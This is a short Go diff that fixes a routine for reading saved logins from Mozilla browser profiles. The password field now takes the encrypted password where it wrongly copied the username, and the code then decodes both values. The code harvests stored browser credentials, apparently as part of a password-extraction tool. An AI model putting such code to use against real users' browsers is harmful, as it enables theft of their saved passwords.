@@ -126,7 +126,7 @@ func GetMozillaFromLogins(profilePaths []string, applicationName string) []Login
 						logins_table_struct := Logins_table_struct{}
 						logins_table_struct.Origin_url = login_info.Hostname
 						logins_table_struct.Username_value = login_info.Encryptedusername
-						logins_table_struct.Password_value = login_info.Encryptedusername
+						logins_table_struct.Password_value = login_info.EncryptedPassword
 
 						if err_finallyKey == nil {
 							user_byte, err := base64.StdEncoding.DecodeString(logins_table_struct.Username_value)
